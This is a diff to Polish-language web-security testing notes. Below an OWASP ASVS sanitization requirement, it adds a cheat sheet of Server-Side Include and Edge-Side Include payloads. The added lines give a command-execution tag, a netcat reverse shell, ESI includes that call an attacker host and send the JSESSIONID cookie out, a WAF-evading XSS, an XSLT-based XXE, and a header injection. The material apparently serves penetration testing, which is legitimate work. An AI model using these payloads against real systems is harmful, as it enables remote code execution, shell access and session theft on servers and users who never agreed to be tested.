@@ -113,3 +113,22 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
 | V1.3.3 | Sanitization | Verify that data being passed to a potentially dangerous context is sanitized beforehand to enforce safety measures, such as only allowing characters which are safe for this context and trimming input which is too long. |
+
+
+---
+
+## HackTricks Tips
+
+### SSI (Server-Side Includes)
+
+- **RCE**: `<!--#exec cmd="ls" -->`
+- **Reverse shell**: `<!--#exec cmd="mkfifo /tmp/foo;nc IP PORT 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->`
+
+### ESI (Edge-Side Includes)
+
+- **Detection**: `hell<!--esi-->o` — jeśli zwraca "hello" = vulnerable
+- **Blind**: `<esi:include src=http://attacker.com>`
+- **Cookie theft (bypass httpOnly)**: `<esi:include src=http://attacker/?c=$(HTTP_COOKIE{'JSESSIONID'})>`
+- **WAF bypass XSS**: `<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>`
+- **ESI + XSLT = XXE**: `<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />`
+- **Dodanie headera**: `<!--esi/$add_header('Content-Type','text/html')/-->` → XSS bypass Content-Type
